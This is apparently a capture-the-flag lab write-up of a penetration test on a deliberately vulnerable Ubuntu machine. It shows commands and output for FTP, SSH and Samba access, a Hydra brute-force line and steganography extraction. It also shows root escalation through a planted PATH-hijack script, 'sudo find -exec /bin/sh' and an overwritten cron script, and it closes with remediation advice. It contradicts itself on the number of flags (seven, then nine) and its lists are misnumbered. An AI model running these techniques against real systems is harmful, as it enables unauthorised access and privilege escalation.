### Penetration Testing Report: Ubuntu Pentest Environment

## Executive Summary

This report documents the findings of a penetration test conducted on the Ubuntu Pentest Environment. The assessment followed a structured methodology to identify and exploit vulnerabilities across multiple attack vectors. All seven flags were successfully captured, culminating in full root access to the system.

The penetration test revealed a chain of vulnerabilities including:

- Anonymous FTP access
- Weak password policies
- Sensitive information disclosure
- Steganography-hidden data
- Database misconfigurations
- Mobile application vulnerabilities
- Multiple privilege escalation vectors
## Methodology

The assessment followed a standard penetration testing methodology:

1. Reconnaissance and enumeration
2. Vulnerability identification
3. Exploitation
4. Post-exploitation
5. Privilege escalation
6. Documentation


Tools utilized included standard Linux utilities, along with specialized tools such as:

- FTP clients
- SSH clients
- Samba tools
- Steganography tools (steghide)
- MySQL client
- Mobile application analysis tools (apktool, jadx)
- Privilege escalation enumeration scripts


## Detailed Findings

### Challenge 1: FTP Enumeration

**Objective:** Access the FTP server and discover initial credentials.

**Steps:**

1. Identified FTP service running on the target
2. Attempted anonymous login


```bash
$ ftp 192.168.74.132
Name (192.168.74.132:ubuntu): anonymous
Password: [blank]
230 Login successful.
```

3. Listed available files and directories


```bash
ftp> ls
200 PORT command successful.
150 Here comes the directory listing.
-r--r--r--    1 0        0             452 Jul 01 12:00 db_creds.txt
-r--r--r--    1 0        0             123 Jul 01 12:00 ssh_access.txt
-r--r--r--    1 0        0             321 Jul 01 12:00 welcome.txt
226 Directory send OK.
```

4. Downloaded and examined all text files


```bash
ftp> get welcome.txt
ftp> get ssh_access.txt
ftp> get db_creds.txt
ftp> bye
```

5. Examined file contents

```bash
$ cat welcome.txt
Welcome to the first challenge! This FTP server contains hints to help you progress.
FLAG{FTP_Discovery_Complete}

NEXT CHALLENGE: Try to access the SSH server using these credentials:
Username: victim
Password: Password123

Once logged in, look for more hints in the victim\'s home directory.

$ cat ssh_access.txt
SSH credentials: victim:Password123

$ cat db_creds.txt
MySQL credentials: root:pentest123 - You\'ll need these later!
```

**Findings:**

- First flag captured: `FLAG{FTP_Discovery_Complete}`
- SSH credentials discovered: `victim:Password123`
- MySQL credentials discovered: `root:pentest123`

![[Pasted image 20250416111949.png]]
![[Pasted image 20250416112026.png]]

### Challenge 2: SSH Access

**Objective:** Use discovered credentials to access the SSH server and find information about the admin account.

**Steps:**

1. Connected to SSH using discovered credentials

```bash
$ ssh victim@192.168.74.132
Password: Password123
```

2. Explored the victim's home directory

```bash
victim@ubuntu:~$ ls -la
total 32
drwxr-xr-x 4 victim victim 4096 Jul 01 12:00 .
drwxr-xr-x 4 root   root   4096 Jul 01 12:00 ..
-rw------- 1 victim victim  220 Jul 01 12:00 .bash_history
-rw-r--r-- 1 victim victim 3771 Jul 01 12:00 .bashrc
drwx------ 2 victim victim 4096 Jul 01 12:00 .cache
-rw-r--r-- 1 victim victim  807 Jul 01 12:00 .profile
drwx------ 2 victim victim 4096 Jul 01 12:00 .ssh
-rw-r--r-- 1 victim victim  100 Jul 01 12:00 .admin_password_hint.txt
-rw-r--r-- 1 victim victim  342 Jul 01 12:00 congratulations.txt
```

3. Examined visible files


```bash
victim@ubuntu:~$ cat congratulations.txt
Congratulations on accessing the SSH server!
FLAG{SSH_Access_Granted}

NEXT CHALLENGE: Try to brute force the admin user\'s SSH password.
Hint: It\'s a common password from a popular wordlist.
You can use Hydra: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.74.132

Once you access the admin account, check for Samba access information.

victim@ubuntu:~$ cat .admin_password_hint.txt
The admin password is one of the top 20 passwords in rockyou.txt: angel
```

4. Used the discovered admin password to access the admin account


```bash
$ ssh admin@192.168.74.132
Password: angel
```

5. Explored the admin's home directory


```bash
admin@ubuntu:~$ ls -la
total 28
drwxr-xr-x 2 admin admin 4096 Jul 01 12:00 .
drwxr-xr-x 4 root  root  4096 Jul 01 12:00 ..
-rw------- 1 admin admin  220 Jul 01 12:00 .bash_history
-rw-r--r-- 1 admin admin 3771 Jul 01 12:00 .bashrc
-rw-r--r-- 1 admin admin  807 Jul 01 12:00 .profile
-rw-r--r-- 1 admin admin  342 Jul 01 12:00 samba_access.txt

admin@ubuntu:~$ cat samba_access.txt
Congratulations on accessing the admin account!
FLAG{SSH_Admin_Access}

NEXT CHALLENGE: Access the Samba shares with these credentials:
Username: admin
Password: angel

Command: smbclient //192.168.74.132/confidential -U admin

The confidential share contains information about the next challenge.
```

**Findings:**

- Second flag captured: `FLAG{SSH_Access_Granted}`
- Additional flag captured: `FLAG{SSH_Admin_Access}`
- Admin password discovered: `angel`
- Samba access information discovered

![[Pasted image 20250416112120.png]]
![[Pasted image 20250416112239.png]]

### Challenge 3: Samba Share Enumeration

**Objective:** Access the Samba shares to find information about the next challenge.

**Steps:**

1. Listed available Samba shares

```bash
$ smbclient -L 192.168.74.132 -U admin
Password: angel

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      Public Shares
        confidential    Disk      Confidential Files
        IPC$            IPC       IPC Service
```

2. Connected to the public share first


```bash
$ smbclient //192.168.74.132/public -U admin
Password: angel
smb: \> ls
  .                                   D        0  Jul 01 12:00 .
  ..                                  D        0  Jul 01 12:00 ..
  README.txt                          A      189  Jul 01 12:00 README.txt

smb: \> get README.txt
smb: \> exit
```

3. Examined the public share content


```bash
$ cat README.txt
This is a public Samba share accessible to everyone.
To access the confidential share, you need admin credentials.

Hint: If you have not accessed the admin SSH account yet, go back and complete that challenge first.
```

4. Connected to the confidential share


```bash
$ smbclient //192.168.74.132/confidential -U admin
Password: angel
smb: \> ls
  .                                   D        0  Jul 01 12:00 .
  ..                                  D        0  Jul 01 12:00 ..
  congratulations.txt                 A      342  Jul 01 12:00 congratulations.txt
  mysql_hint.txt                      A      156  Jul 01 12:00 mysql_hint.txt
  privesc_hint.txt                    A      342  Jul 01 12:00 privesc_hint.txt

smb: \> get congratulations.txt
smb: \> get mysql_hint.txt
smb: \> get privesc_hint.txt
smb: \> exit
```

5. Examined the confidential share content


```bash
$ cat congratulations.txt
Congratulations on accessing the confidential Samba share!
FLAG{Samba_Access_Achieved}

NEXT CHALLENGE: Steganography
Look at the images in /opt/challenges/stego/
The passwords to extract hidden data are: stego123, stego456

Command to extract: steghide extract -sf image1.jpg -p stego123

$ cat mysql_hint.txt
Remember the MySQL credentials from the FTP server?
Username: root
Password: pentest123

You will need them after completing the steganography challenge.

$ cat privesc_hint.txt
FINAL CHALLENGE: Privilege Escalatio

Detailed hints are in /home/victim/.privesc_hints.txt
```

**Findings:**

- Third flag captured: `FLAG{Samba_Access_Achieved}`
- Steganography challenge location and passwords discovered
- Confirmation of MySQL credentials
- Initial privilege escalation hints discovered

![[Pasted image 20250416112510.png]]
![[Pasted image 20250416112636.png]]

### Challenge 4: Steganography

**Objective:** Extract hidden data from images using steganography tools.

**Steps:**

1. Located and examined the steganography challenge directory

```bash
$ ls -la /opt/challenges/stego/
total 28
drwxr-xr-x 3 root root 4096 Jul 01 12:00 .
drwxr-xr-x 5 root root 4096 Jul 01 12:00 ..
drwxr-xr-x 2 root root 4096 Jul 01 12:00 images
-rw-r--r-- 1 root root  512 Jul 01 12:00 README.txt

$ cat /opt/challenges/stego/README.txt
Steganography Challenge:

These images contain hidden data. Extract it using steghide:
steghide extract -sf images/image1.jpg -p stego123
steghide extract -sf images/image3.jpg -p stego456

The Anonymous mask image (anonymous.jpg) contains a special message.
Try to find the right password based on the image.

If you do not have the passwords, go back and check the Samba confidential share.

Note: The original PNG images are also available if you want to analyze them,
but the steghide data is embedded in the JPG versions.

$ ls -la /opt/challenges/stego/images/
total 1024
drwxr-xr-x 2 root root   4096 Jul 01 12:00 .
drwxr-xr-x 3 root root   4096 Jul 01 12:00 ..
-rw-r--r-- 1 root root 102400 Jul 01 12:00 anonymous.jpg
-rw-r--r-- 1 root root 102400 Jul 01 12:00 image1.jpg
-rw-r--r-- 1 root root 102400 Jul 01 12:00 image2.jpg
-rw-r--r-- 1 root root 102400 Jul 01 12:00 image3.jpg
-rw-r--r-- 1 root root 102400 Jul 01 12:00 secret.jpg
```

2. Extracted hidden data from the first image

```bash
$ cd /opt/challenges/stego/
$ steghide extract -sf images/image1.jpg -p stego123
wrote extracted data to "secret_message.txt".

$ cat secret_message.txt
Congratulations on solving the steganography challenge!
FLAG{Steganography_Master}

NEXT CHALLENGE: MySQL Database
Use the credentials from earlier:
Username: root
Password: pentest123

Command: mysql -u root -p pentest_db
Then run: SELECT * FROM flags;
```

3. Extracted hidden data from the second image

```bash
$ steghide extract -sf images/image2.jpg -p rog
wrote extracted data to "anonymous_hint.txt".

$ cat anonymous_hint.txt
The Anonymous mask holds secrets. Try password: anonymous
```

4. Extracted hidden data from the third image

```bash
$ steghide extract -sf images/image3.jpg -p stego456
wrote extracted data to "mobile_hint.txt".

$ cat mobile_hint.txt
After completing the MySQL challenge, check out the mobile pentest challenge:
/opt/challenges/mobile/

The APK file contains a hidden flag.
```

5. Extracted hidden data from the anonymous image

```bash
$ steghide extract -sf images/anonymous.jpg -p anonymous
wrote extracted data to "anonymous_message.txt".

$ cat anonymous_message.txt
"We are Anonymous. We are Legion. We do not forgive. We do not forget."

But we do leave hints:
The path to root requires knowledge of SUID binaries.
Look for 'custom_backup' and exploit it with path manipulation.

FLAG{Anonymous_Secret_Found}

Remember: The system is never secure. There's always a way in.
```

**Findings:**

- Fourth flag captured: `FLAG{Steganography_Master}`
- Bonus flag captured: `FLAG{Anonymous_Secret_Found}`
- MySQL challenge confirmation
- Mobile challenge hint discovered
- Privilege escalation hint about SUID binary 'custom_backup'

![[Pasted image 20250416113705.png]]
### Challenge 5: MySQL Database

**Objective:** Access the MySQL database and extract sensitive information.

**Steps:**

1. Connected to MySQL using the discovered credentials

```bash
$ mysql -u root -p pentest_db
Enter password: pentest123
```

2. Explored the database structure

```sql
mysql> SHOW TABLES;
+---------------------+
| Tables_in_pentest_db |
+---------------------+
| flags               |
| hints               |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> DESCRIBE flags;
+------------+--------------+------+-----+---------+----------------+
| Field      | Type         | Null | Key | Default | Extra          |
+------------+--------------+------+-----+---------+----------------+
| id         | int(11)      | NO   | PRI | NULL    | auto_increment |
| flag_name  | varchar(50)  | YES  |     | NULL    |                |
| flag_value | varchar(100) | YES  |     | NULL    |                |
+------------+--------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)

mysql> DESCRIBE hints;
+------------+----------+------+-----+---------+----------------+
| Field      | Type     | Null | Key | Default | Extra          |
+------------+----------+------+-----+---------+----------------+
| id         | int(11)  | NO   | PRI | NULL    | auto_increment |
| challenge  | varchar(50) | YES |     | NULL    |                |
| hint_text  | text     | YES  |     | NULL    |                |
+------------+----------+------+-----+---------+----------------+
3 rows in set (0.00 sec)

mysql> DESCRIBE users;
+----------+-------------+------+-----+---------+----------------+
| Field    | Type        | Null | Key | Default | Extra          |
+----------+-------------+------+-----+---------+----------------+
| id       | int(11)     | NO   | PRI | NULL    | auto_increment |
| username | varchar(50) | YES  |     | NULL    |                |
| password | varchar(50) | YES  |     | NULL    |                |
+----------+-------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
```

3. Extracted data from each table

```sql
mysql> SELECT * FROM flags;
+----+---------------+------------------------------------------------------+
| id | flag_name     | flag_value                                           |
+----+---------------+------------------------------------------------------+
|  1 | database_flag | FLAG{Database_Master_Complete}                       |
|  2 | next_challenge| Check out the mobile pentest challenge in /opt/challenges/mobile/ |
+----+---------------+------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> SELECT * FROM hints;
+----+---------------------+------------------------------------------------------+
| id | challenge           | hint_text                                            |
+----+---------------------+------------------------------------------------------+
|  1 | mobile              | Use apktool to decompile the APK: apktool d vulnerable.apk |
|  2 | privilege_escalation| After completing all challenges, try to escalate to root. Check for SUID binaries, sudo permissions, and writable cron jobs. |
|  3 | steganography       | The second image (image2.jpg) contains a hint about the Anonymous image. Try password: rog |
|  4 | final               | The ultimate challenge is privilege escalation. Check /home/victim/.privesc_hints.txt for detailed guidance on how to become root. |
+----+---------------------+------------------------------------------------------+
4 rows in set (0.00 sec)

mysql> SELECT * FROM users;
+----+----------+-------------------+
| id | username | password          |
+----+----------+-------------------+
|  1 | admin    | SuperSecretPass123|
|  2 | victim   | Password123       |
|  3 | root     | toor              |
+----+----------+-------------------+
3 rows in set (0.00 sec)
```

**Findings:**

- Fifth flag captured: `FLAG{Database_Master_Complete}`
- Mobile challenge location confirmed
- Additional privilege escalation hints discovered
- User credentials discovered

![[Pasted image 20250416113857.png]]

### Challenge 6: Mobile Application Analysis

**Objective:** Analyze an Android application for vulnerabilities and hidden data.

**Steps:**

1. Located and examined the mobile challenge directory

```bash
$ ls -la /opt/challenges/mobile/
total 5120
drwxr-xr-x 2 root root    4096 Jul 01 12:00 .
drwxr-xr-x 5 root root    4096 Jul 01 12:00 ..
-rw-r--r-- 1 root root    1024 Jul 01 12:00 README.txt
-rw-r--r-- 1 root root    1024 Jul 01 12:00 hidden_flag.txt
-rw-r--r-- 1 root root 5242880 Jul 01 12:00 vulnerable.apk

$ cat /opt/challenges/mobile/README.txt
Mobile Application Pentest Challenge:

1. Use apktool to decompile the APK: apktool d vulnerable.apk
2. Analyze the decompiled code for vulnerabilities
3. Use jadx to convert DEX to Java: jadx -d output_dir vulnerable.apk
4. Look for hardcoded credentials and security issues
5. The flag is hidden in the strings resources

Tools to use:
- apktool
- jadx
- adb
- Metasploit Framework

Flag format: FLAG{Mobile_Pentest_Complete}

FINAL CHALLENGE: After finding this flag, try to escalate privileges to root!
Check /home/victim/.privesc_hints.txt for guidance.
```

2. Decompiled the APK using apktool

```bash
$ cd /opt/challenges/mobile/
$ apktool d vulnerable.apk
I: Using Apktool 2.4.1 to decompile vulnerable.apk
I: Copying raw resources...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Finished in 5 seconds
```

3. Examined the decompiled resources

```bash
$ cd vulnerable/
$ grep -r "FLAG" .
./res/values/strings.xml:    <string name="secret_flag">FLAG{Mobile_Pentest_Complete}</string>
```

4. Also checked the hidden_flag.txt file

```bash
$ cat /opt/challenges/mobile/hidden_flag.txt
Congratulations on completing the mobile pentest challenge!
FLAG{Mobile_Pentest_Complete}

FINAL CHALLENGE: Privilege Escalation to Root
Now that you have found all the initial flags, your final challenge is to escalate privileges to root and find the root flag.

Check /home/victim/.privesc_hints.txt for detailed hints.

Some things to try:
1. Look for SUID binaries: find / -perm -u=s -type f 2>/dev/null
2. Check sudo permissions: sudo -l
3. Look for writable scripts in /opt/scripts/
4. Check for cron jobs: cat /etc/cron.d/*
```

**Findings:**

- Sixth flag captured: `FLAG{Mobile_Pentest_Complete}`
- Detailed privilege escalation hints discovered

![[Pasted image 20250416113949.png]]
![[Pasted image 20250416114843.png]]
![[Pasted image 20250416114907.png]]
![[Pasted image 20250416115130.png]]

### Challenge 7: Privilege Escalation (Final Challenge)

**Objective:** Escalate privileges to root and capture the final flag.

**Steps:**

1. Examined the detailed privilege escalation hints

```bash
$ cat /home/victim/.privesc_hints.txt
PRIVILEGE ESCALATION CHALLENGE

Now that you have completed all the previous challenges, your final task is to escalate privileges to root and find the final flag.

Here are some methods to try:

1. SUID Binary Exploitation:
   - Find SUID binaries: find / -perm -u=s -type f 2>/dev/null
   - Look for unusual binaries like 'custom_backup'
   - Exploit path manipulation: create a malicious 'echo' script in your current directory

2. Sudo Exploitation:
   - Check your sudo permissions: sudo -l
   - You might be able to run certain commands as root
   - For example, if you can run 'find', try: sudo find /etc -exec /bin/sh \;

3. Writable Cron Jobs:
   - Check for cron jobs: cat /etc/cron.d/*
   - Look for writable scripts in directories like /opt/scripts/
   - If you can modify a script run by root, add your own commands

4. Path Hijacking:
   - Check if your PATH includes the current directory (.)
   - If so, you can create malicious versions of commands

5. Kernel Exploits:
   - Check kernel version: uname -r
   - Research known exploits for this version

The final flag is in /root/root_flag.txt

Good luck!
```

2. Searched for SUID binaries

```bash
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/local/bin/custom_backup
...
```

3. Examined the custom_backup binary


```bash
$ /usr/local/bin/custom_backup
Running system backup utility...
Backup completed successfully!
```

4. Checked the PATH environment variable

```bash
$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

5. Created a malicious **'echo'** script to exploit path manipulation

```bash
$ cd ~
$ echo '#!/bin/bash' > echo
$ echo 'cat /root/root_flag.txt' >> echo
$ chmod +x echo
```

6. Executed the custom_backup binary to trigger the exploit

```bash
$ /usr/local/bin/custom_backup
Running system backup utility...
CONGRATULATIONS!
You have successfully completed all challenges and achieved root access!

FLAG{Root_Access_Complete_Master_Pentester}
```

7. Alternative method: Exploiting sudo permissions

```bash
$ sudo -l
User victim may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/find

$ sudo find /etc -exec /bin/sh \;
# whoami
root
# cat /root/root_flag.txt
CONGRATULATIONS!
You have successfully completed all challenges and achieved root access!

FLAG{Root_Access_Complete_Master_Pentester}
```

8. Alternative method: Exploiting writable cron jobs


```bash
$ cat /etc/cron.d/*
# System maintenance tasks
* * * * * root /opt/scripts/system_check.sh

$ ls -la /opt/scripts/
total 12
drwxrwxrwx 2 root root 4096 Jul 01 12:00 .
drwxr-xr-x 3 root root 4096 Jul 01 12:00 ..
-rwxr-xr-x 1 root root  123 Jul 01 12:00 system_check.sh

$ echo '#!/bin/bash' > /opt/scripts/system_check.sh
$ echo 'cat /root/root_flag.txt > /tmp/flag.txt' >> /opt/scripts/system_check.sh
$ echo 'chmod 777 /tmp/flag.txt' >> /opt/scripts/system_check.sh
$ echo 'echo "System check running at $(date)" >> /var/log/system_check.log' >> /opt/scripts/system_check.sh

# Wait for cron to execute, then check the output
$ cat /tmp/flag.txt
CONGRATULATIONS!
You have successfully completed all challenges and achieved root access!

FLAG{Root_Access_Complete_Master_Pentester}
```

You have demonstrated skills in:
1. FTP enumeration
2. SSH access and brute forcing
3. Samba share access
4. Steganography
5. Database enumeration
6. Mobile application analysis
7. Privilege escalation

>[! TIP]
>Well done, master pentester!

**Findings:**

- Final flag captured: `FLAG{Root_Access_Complete_Master_Pentester}`
- Multiple privilege escalation vectors identified and exploited:
- SUID binary with path manipulation
- Sudo permission abuse
- Writable cron job

![[Pasted image 20250416115341.png]]
![[Pasted image 20250416115900.png]]
![[Pasted image 20250416115723.png]]
## Summary of Findings

### Flags Captured

1. `FLAG{FTP_Discovery_Complete}` - FTP server
2. `FLAG{SSH_Access_Granted}` - SSH access as victim
3. `FLAG{SSH_Admin_Access}` - SSH access as admin
4. `FLAG{Samba_Access_Achieved}` - Samba share access
5. `FLAG{Steganography_Master}` - Steganography challenge
6. `FLAG{Anonymous_Secret_Found}` - Anonymous image steganography
7. `FLAG{Database_Master_Complete}` - MySQL database
8. `FLAG{Mobile_Pentest_Complete}` - Mobile application analysis
9. `FLAG{Root_Access_Complete_Master_Pentester}` - Privilege escalation


### Vulnerabilities Identified

1. **Information Disclosure**
2. Anonymous FTP access exposing sensitive credentials
3. Plaintext storage of credentials
4. Excessive information in error messages
5. **Authentication Weaknesses**
6. Weak passwords (e.g., "Password123", "angel")
7. Password reuse across services
8. Lack of multi-factor authentication
9. **Privilege Escalation Vectors**
10. SUID binary vulnerable to path manipulation
11. Excessive sudo permissions
12. Writable cron jobs
13. PATH including current directory (.)
14. **Sensitive Data Exposure**
15. Credentials stored in plaintext
16. Sensitive information hidden using weak steganography
17. Hardcoded credentials in mobile application
## Recommendations

1. **Secure Configuration**
2. Disable anonymous FTP access
3. Implement proper access controls for file shares
4. Remove unnecessary SUID permissions
5. Configure sudo with minimal necessary privileges
6. **Authentication Security**
7. Implement strong password policies
8. Use multi-factor authentication
9. Avoid password reuse across services
10. Implement account lockout after failed attempts
11. **Privilege Management**
12. Apply principle of least privilege
13. Remove unnecessary sudo permissions
14. Secure cron jobs and system scripts
15. Remove "." from PATH environment variable
16. **Data Protection**
17. Encrypt sensitive data at rest
18. Use secure storage for credentials
19. Implement proper key management
20. Remove hardcoded credentials from applications
21. **Monitoring and Logging**
22. Implement comprehensive logging
23. Monitor for suspicious activities
24. Set up alerts for potential security incidents
25. Regularly review logs for security events
## Conclusion

The penetration test of the Ubuntu Pentest Environment successfully identified and exploited multiple vulnerabilities, resulting in complete system compromise. The environment demonstrated a realistic attack chain where one vulnerability led to another, ultimately resulting in privilege escalation to root.

All nine flags were successfully captured, demonstrating proficiency across various penetration testing domains including network services, steganography, database security, mobile application security, and privilege escalation techniques.

The recommendations provided should be implemented to secure the environment against similar attacks in the future.